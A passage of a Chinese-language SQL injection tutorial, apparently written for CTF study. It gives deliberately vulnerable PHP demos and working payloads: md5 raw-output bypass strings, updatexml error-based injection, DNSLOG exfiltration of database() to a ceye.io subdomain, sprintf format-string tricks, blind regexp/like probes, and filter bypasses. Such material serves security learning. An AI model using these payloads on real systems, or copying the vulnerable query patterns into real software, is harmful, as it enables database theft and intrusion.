<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">mysql_connect(<span class="string">"127.0.0.1"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>) or die(<span class="string">"Database connection failed "</span>);</span><br><span class="line">mysql_select_db(<span class="string">"sqlidemo"</span>) or die(<span class="string">"Select database failed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$order</span> = <span class="variable">$_GET</span>[<span class="string">'order'</span>] ? <span class="variable">$_GET</span>[<span class="string">'order'</span>] : <span class="string">'name'</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select id,name,price from goods order by <span class="variable">$order</span>"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reslist</span> = array();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>, MYSQL_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">  array_push(<span class="variable">$reslist</span>, <span class="variable">$row</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> json_encode(<span class="variable">$reslist</span>);</span><br></pre></td></tr></table></figure>
<p>sql</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create database sqlidemo;</span><br><span class="line">use sqlidemo;</span><br><span class="line">create table goods (id int(4) not null primary key auto_increment, name char(32) not null, price int(4) not null);</span><br><span class="line">insert into goods (name, price)  values(<span class="string">"apple"</span>, 10);</span><br><span class="line">insert into goods (name, price) values(<span class="string">"banana"</span>, 15);</span><br><span class="line">insert into goods (name, price) values(<span class="string">"peach"</span>, 20);</span><br></pre></td></tr></table></figure>
<h2 id="MD5注入"><a href="#MD5注入" class="headerlink" title="MD5注入"></a>MD5注入</h2><p>详细可看<a href="http://blog.lvguangfa.cn/ctf/135.html" target="_blank" rel="noopener">http://blog.lvguangfa.cn/ctf/135.html</a><br>当php中使用到 md5($str,true) 输出md5值时，二进制被HEXdecode后可能会包含例如’or 1#的字符，从而产生sql注入</p>
<p>先看php中的md5函数，它有两个参数string和raw。<br>第一个参数string是必需的，规定要计算的字符串。<br>第二个参数raw可选，规定十六进制或二进制输出格式：</p>
<p>TRUE - 原始 - 16 字符二进制格式<br>FALSE - 默认 - 32 字符十六进制数<br>注入姿势： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=129581926211651571912466741651878684928  //T0Do<span class="comment">#'or'8</span></span><br><span class="line">password=ffifdyop //<span class="string">'or'</span>6]!r,b</span><br></pre></td></tr></table></figure>

<p>测试题目 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">"'"</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;0)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Success'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Failure'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="insert、update和delete报错注入"><a href="#insert、update和delete报错注入" class="headerlink" title="insert、update和delete报错注入"></a>insert、update和delete报错注入</h2><p><a href="http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">传统insert、update和delete报错注入 </a><br><a href="https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/" target="_blank" rel="noopener">新式MySQL Injection in Update, Insert and Delete</a><br>0x1 传统利用方式<br>0x 1.1 insert  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">这里我们用updatexml来演示</span><br><span class="line">使用逻辑运算符（and or xor &amp;&amp; ||）</span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span> xor updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line">mysql&gt; insert into users values (5,<span class="string">'name'</span> and updatexml(2,concat(0x7e,(version())),0) and <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用算数运算符（+ – * /）</span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>+updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>*updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用位运算符连接（| &amp;）</span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>&amp;updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br><span class="line">mysql&gt; insert into users values (3,<span class="string">'name'</span>|updatexml(2,concat(0x7e,(version())),0) xor <span class="string">''</span>,<span class="string">'pass'</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br></pre></td></tr></table></figure>
<p>0x1.2 update</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update users <span class="built_in">set</span> username = <span class="string">'name'</span> and updatexml(2,concat(0x7e,(version())),0) and <span class="string">''</span> <span class="built_in">where</span> id = 5;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br></pre></td></tr></table></figure>
<p>0x1.3 delete</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from users <span class="built_in">where</span> id = 5 or updatexml(2,concat(0x7e,(version())),0) or <span class="string">''</span>;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: <span class="string">'~5.5.40-log'</span></span><br></pre></td></tr></table></figure>
<p>0x2 新式利用<br>语句格式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);</span><br></pre></td></tr></table></figure>
<p>0x2.1 update</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update emails <span class="built_in">set</span> email_id=<span class="string">'osanda'</span>|conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)),16, 10) <span class="built_in">where</span> id=<span class="string">'16'</span>;</span><br></pre></td></tr></table></figure>
<p>0x2.2 Insert</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (17,<span class="string">'james'</span>, <span class="string">'bond'</span>|conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)),16, 10);</span><br></pre></td></tr></table></figure>
<p>0x2.3 Limitations in MySQL 5.7</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update ignore users <span class="built_in">set</span> username = <span class="string">'osanda'</span> | conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)),16, 10) <span class="built_in">where</span> id=14;</span><br></pre></td></tr></table></figure>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p> 详细可看此文章:<a href="http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/" target="_blank" rel="noopener">MySQL注入系列之二次注入(三)</a><br> 测试代码<br> config.php<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'mysql'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'sqlinject'</span>);</span><br><span class="line">mysql_set_charset(<span class="string">'utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span> (!get_magic_quotes_gpc())&#123;</span><br><span class="line">    <span class="keyword">if</span> (!empty(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">        <span class="variable">$_GET</span> = addslashes_deep(<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!empty(<span class="variable">$_POST</span>))&#123;</span><br><span class="line">        <span class="variable">$_POST</span> = addslashes_deep(<span class="variable">$_POST</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_COOKIE</span> = addslashes_deep(<span class="variable">$_COOKIE</span>);</span><br><span class="line">    <span class="variable">$_REQUEST</span> = addslashes_deep(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> addslashes_deep(<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (empty(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">return</span> is_array(<span class="variable">$value</span>) ? array_map(<span class="string">'addslashes_deep'</span>, <span class="variable">$value</span>): addslashes(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br> reg.php<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$_POST</span>[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">'email'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"INSERT INTO `sqlinject`.`users` (`id`, `username`, `password`, `email`)</span></span><br><span class="line"><span class="string">           VALUE (NULL, '<span class="variable">$username</span>', '<span class="variable">$password</span>', '<span class="variable">$email</span>');"</span>;</span><br><span class="line">    <span class="variable">$row</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"注册成功"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"注册失败"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    username&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;&lt;br/&gt;</span><br><span class="line">    password&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"password"</span>&gt;&lt;br/&gt;</span><br><span class="line">    email&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"email"</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"ok"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><br> search.php<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$_POST</span>[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">'email'</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"select * from users where email='&#123;<span class="variable">$email</span>&#125;'"</span>;</span><br><span class="line">    <span class="variable">$row</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$rows</span> = mysql_fetch_array(<span class="variable">$row</span>);</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$rows</span>[<span class="string">'username'</span>];</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">"select * from users where username='<span class="variable">$username</span>'"</span>;</span><br><span class="line">        <span class="variable">$row</span> = mysql_query(<span class="variable">$sql</span>) or die(mysql_error());</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">            <span class="variable">$rows</span> = mysql_fetch_array(<span class="variable">$row</span>);</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$rows</span>[<span class="string">'username'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$rows</span>[<span class="string">'password'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$rows</span>[<span class="string">'email'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    search email&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"email"</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"ok"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="dns注入"><a href="#dns注入" class="headerlink" title="dns注入"></a>dns注入</h2><p>DNSLOG 注入 ¶<br>DNS 在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p>
<p>dnslog 平台：<a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use security;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(<span class="string">'\\\\test.xxx.ceye.io\\abc'</span>);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| load_file(<span class="string">'\\\\test.xxx.ceye.io\\abc'</span>) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| NULL                                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (22.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(concat(<span class="string">'\\\\'</span>,(select database()),<span class="string">'.xxx.ceye.io\\abc'</span>));</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| load_file(concat(<span class="string">'\\\\'</span>,(select database()),<span class="string">'.xxx.ceye.io\\abc'</span>)) |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| NULL                                                                 |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<h2 id="sprintf注入"><a href="#sprintf注入" class="headerlink" title="sprintf注入"></a>sprintf注入</h2><p>1，sprintf(),函数是php中的函数<br>2，作用是将格式化字符串写入变量中<br>3，函数形式为sprintf(format,arg1,arg2,arg++)   </p>
<p> 参数说明：<br><img src="../../images/loopholes/sql/5.png" alt=""></p>
<p>若%符号多于arg参数，则需要占位符，占位符格式为“%number$” 其中number表示该项与第几个arg匹配，如若与第一个匹配     则占位符为“%1$” </p>
<p>sprintf注入的原理就是:<br>我们用一个15种类型之外的 “&quot;来代替格式字符类型让函数替换为空，则“%1$&#39;”后面的单引号就能闭合前面的单引号 。<br>如果我们输入”%&quot;或者”%1$&quot;,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么”%&quot;,”%1$&quot;就因为没有经过任何处理而被替换为空。 </p>
<p>例子:      </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（'），双引号（"），反斜杠（\），NULL</span></span><br><span class="line">$input = addslashes (<span class="string">"%1$' and 1=1#"</span> );</span><br><span class="line">$b = sprintf (<span class="string">"AND b='%s'"</span>, $input );</span><br><span class="line">$sql = sprintf (<span class="string">"SELECT * FROM t WHERE a='%s' $b "</span>, <span class="string">'admin'</span> );</span><br><span class="line"><span class="keyword">echo</span>  $sql ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">1</span>$\<span class="string">' and 1=1#</span></span><br><span class="line"><span class="string">AND b='</span>%<span class="number">1</span>$\<span class="string">' and 1=1#'</span></span><br><span class="line">SELECT * FROM t WHERE a=<span class="string">'admin'</span> <span class="keyword">AND</span> b=<span class="string">''</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#'</span></span><br></pre></td></tr></table></figure>

<p>另一个例子:  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$input1 = <span class="string">'%1$c) OR 1 = 1 /*'</span> ;</span><br><span class="line">$input2 = <span class="number">39</span> ;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM foo WHERE bar IN (' $input1 ') AND baz = %s"</span> ;</span><br><span class="line"><span class="keyword">echo</span>($sql.<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">$sql = sprintf ( $sql , $input2 );</span><br><span class="line"><span class="keyword">echo</span>  $sql ;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM foo WHERE bar IN (<span class="string">' %1$c) OR 1 = 1 /* '</span>) <span class="keyword">AND</span> baz = %s</span><br><span class="line">SELECT * FROM foo WHERE bar IN (<span class="string">' '</span>) <span class="keyword">OR</span> <span class="number">1</span> = <span class="number">1</span> <span class="comment">/* ') AND baz = 39</span></span><br></pre></td></tr></table></figure>
<h2 id="REGEXP注入分析"><a href="#REGEXP注入分析" class="headerlink" title="REGEXP注入分析"></a>REGEXP注入分析</h2><p>使用场景：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了&#x3D;、in、like</span><br></pre></td></tr></table></figure>
<p>^若被过滤，可使用$来从后往前进行匹配</p>
<p>常用regexp正则语句：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp <span class="string">'^[a-z]'</span>  <span class="comment">#判断一个表的第一个字符串是否在a-z中</span></span><br><span class="line">regexp <span class="string">'^r'</span>      <span class="comment">#判断第一个字符串是否为r</span></span><br><span class="line">regexp <span class="string">'^r[a-z]'</span> <span class="comment">#判断一个表的第二个字符串是否在a-z中</span></span><br></pre></td></tr></table></figure>
<h2 id="LIKE注入分析"><a href="#LIKE注入分析" class="headerlink" title="LIKE注入分析"></a>LIKE注入分析</h2><p>like匹配<br>百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。<br>1.like ‘s%’判断第一个字符是否为s</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'s%'</span>,3 --+</span><br></pre></td></tr></table></figure>
<p>2.like ‘se%’判断前面两个字符串是否为se</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'se%'</span>,3 --+</span><br></pre></td></tr></table></figure>
<p>3.like ‘%sq%’ 判断是否包含se两个字符串</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'%se%'</span>,3 --+</span><br></pre></td></tr></table></figure>
<p>4.like ‘_____’判断是否为5个字符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'_____'</span>,3 --+</span><br></pre></td></tr></table></figure>
<p>5.like ‘s____’ 判断第一个字符是否为s</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'s____'</span>,3 --+</span><br></pre></td></tr></table></figure>

<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>详情可看：<a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98206699</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure>

<h1 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>1.使用注释符<code>/**/</code>绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT/**/name/**/FROM/**/table</span><br></pre></td></tr></table></figure>
<p>2.使用url编码绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%a0 发出去就是空格的意思，但是需要在burp中抓包后修改</span><br></pre></td></tr></table></figure>
<p>3.使用浮点数绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=8E0union select 1,2,3</span><br><span class="line">等价于</span><br><span class="line">select * from users <span class="built_in">where</span> id=8.0 select 1,2,3</span><br></pre></td></tr></table></figure>
<p>4.使用Tab替代空格<br>5.使用两个空格替代一个空格<br>6.使用括号绕过<br>如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(user())from dual <span class="built_in">where</span>(1=1)and(2=2)</span><br></pre></td></tr></table></figure>
<p>这种过滤方法常常用于time based盲注,例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and(sleep(ascii(mid(database()from(1)<span class="keyword">for</span>(1)))=109))%23</span><br></pre></td></tr></table></figure>
<h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><p>使用16进制绕过<br>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">"users"</span></span><br></pre></td></tr></table></figure>
<p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。 users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
